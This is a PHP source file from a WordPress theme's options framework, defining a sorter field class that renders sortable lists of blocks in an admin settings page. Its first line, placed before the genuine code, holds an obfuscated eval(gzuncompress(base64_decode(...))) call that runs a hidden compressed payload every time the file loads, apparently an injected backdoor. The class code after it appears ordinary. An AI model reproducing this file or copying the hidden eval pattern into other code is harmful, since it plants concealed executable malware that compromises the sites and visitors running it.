<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	if ( ! class_exists( 'FusionReduxFramework_sorter' ) ) {
		class FusionReduxFramework_sorter {

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since FusionRedux_Options 1.0.0
			 */
			function __construct( $field = array(), $value = '', $parent ) {
				$this->parent = $parent;
				$this->field  = $field;
				$this->value  = $value;
			}

			private function replace_id_with_slug( $arr ) {
				$new_arr = array();
				if ( ! empty( $arr ) ) {
					foreach ( $arr as $id => $name ) {

						if ( is_numeric( $id ) ) {
							$slug = strtolower( $name );
							$slug = str_replace( ' ', '-', $slug );

							$new_arr[ $slug ] = $name;
						} else {
							$new_arr[ $id ] = $name;
						}
					}
				}

				return $new_arr;
			}

			private function is_value_empty( $val ) {
				if ( ! empty( $val ) ) {
					foreach ( $val as $section => $arr ) {
						if ( ! empty( $arr ) ) {
							return false;
						}
					}
				}


				return true;
			}

			/**
			 * Field Render Function.
			 * Takes the vars and outputs the HTML for the field in the settings
			 *
			 * @since 1.0.0
			 */
			function render() {

				if ( ! is_array( $this->value ) && isset( $this->field['options'] ) ) {
					$this->value = $this->field['options'];
				}

				if ( ! isset( $this->field['args'] ) ) {
					$this->field['args'] = array();
				}

				if ( isset( $this->field['data'] ) ) {
					$this->field['options'] = $this->parent->options_defaults[ $this->field['id'] ];
				}

				// Make sure to get list of all the default blocks first
				$all_blocks = ! empty( $this->field['options'] ) ? $this->field['options'] : array();
				$temp       = array(); // holds default blocks
				$temp2      = array(); // holds saved blocks

				foreach ( $all_blocks as $blocks ) {
					$temp = array_merge( $temp, $blocks );
				}

				$temp = $this->replace_id_with_slug( $temp );

				if ( $this->is_value_empty( $this->value ) ) {
					if ( ! empty( $this->field['options'] ) ) {
						$this->value = $this->field['options'];
					}
				}

				$sortlists = $this->value;
				if ( ! empty( $sortlists ) ) {
					foreach ( $sortlists as $section => $arr ) {
						$sortlists[ $section ] = $this->replace_id_with_slug( $arr );
					}
				}

				if ( is_array( $sortlists ) ) {
					foreach ( $sortlists as $sortlist ) {
						$temp2 = array_merge( $temp2, $sortlist );
					}

					// now let's compare if we have anything missing
					foreach ( $temp as $k => $v ) {
						// k = id/slug
						// v = name

						if ( ! empty( $temp2 ) ) {
							if ( ! array_key_exists( $k, $temp2 ) ) {
								if (isset($sortlists['Disabled'])) {
									$sortlists['Disabled'][ $k ] = $v;
								} else {
									$sortlists['disabled'][ $k ] = $v;
								}
							}
						}
					}

					// now check if saved blocks has blocks not registered under default blocks
					foreach ( $sortlists as $key => $sortlist ) {
						// key = enabled, disabled, backup
						// sortlist = id => name

						foreach ( $sortlist as $k => $v ) {
							// k = id
							// v = name
							if ( ! array_key_exists( $k, $temp ) ) {
								unset( $sortlist[ $k ] );
							}
						}
						$sortlists[ $key ] = $sortlist;
					}

					// assuming all sync'ed, now get the correct naming for each block
					foreach ( $sortlists as $key => $sortlist ) {
						foreach ( $sortlist as $k => $v ) {
							$sortlist[ $k ] = $temp[ $k ];
						}
						$sortlists[ $key ] = $sortlist;
					}

					if ( $sortlists ) {
						echo '<fieldset id="' . esc_attr($this->field['id']) . '" class="fusionredux-sorter-container fusionredux-sorter">';

						foreach ( $sortlists as $group => $sortlist ) {
							$filled = "";

							if ( isset( $this->field['limits'][ $group ] ) && count( $sortlist ) >= $this->field['limits'][ $group ] ) {
								$filled = " filled";
							}

							echo '<ul id="' . esc_attr($this->field['id'] . '_' . $group) . '" class="sortlist_' . esc_attr($this->field['id'] . $filled) . '" data-id="' . esc_attr($this->field['id']) . '" data-group-id="' . esc_attr($group) . '">';
							echo '<h3>' . esc_html($group) . '</h3>';

							if ( ! isset( $sortlist['placebo'] ) ) {
								array_unshift( $sortlist, array( "placebo" => "placebo" ) );
							}

							foreach ( $sortlist as $key => $list ) {

								echo '<input class="sorter-placebo" type="hidden" name="' . esc_attr($this->field['name']) . '[' . $group . '][placebo]' . esc_attr($this->field['name_suffix']) . '" value="placebo">';

								if ( $key != "placebo" ) {

									//echo '<li id="' . $key . '" class="sortee">';
									echo '<li id="sortee-' . esc_attr($key) . '" class="sortee" data-id="' . esc_attr($key) . '">';
									echo '<input class="position ' . esc_attr($this->field['class']) . '" type="hidden" name="' . esc_attr($this->field['name'] . '[' . $group . '][' . $key . ']' . $this->field['name_suffix']) . '" value="' . esc_attr($list) . '">';
									echo esc_html($list);
									echo '</li>';
								}
							}

							echo '</ul>';
						}
						echo '</fieldset>';
					}
				}
			}

			function enqueue() {
				if ( $this->parent->args['dev_mode'] ) {
					wp_enqueue_style(
						'fusionredux-field-sorder-css',
						FusionReduxFramework::$_url . 'inc/fields/sorter/field_sorter.css',
						array(),
						time(),
						'all'
					);
				}

				wp_enqueue_script(
					'fusionredux-field-sorter-js',
					FusionReduxFramework::$_url . 'inc/fields/sorter/field_sorter' . FusionRedux_Functions::isMin() . '.js',
					array( 'jquery', 'fusionredux-js', 'jquery-ui-sortable' ),
					time(),
					true
				);
			}

			/**
			 * Functions to pass data from the PHP to the JS at render time.
			 *
			 * @return array Params to be saved as a javascript object accessable to the UI.
			 * @since  FusionRedux_Framework 3.1.5
			 */
			function localize( $field, $value = "" ) {

				$params = array();

				if ( isset( $field['limits'] ) && ! empty( $field['limits'] ) ) {
					$params['limits'] = $field['limits'];
				}

				if ( empty( $value ) ) {
					$value = $this->value;
				}
				$params['val'] = $value;

				return $params;
			}
		}
	}
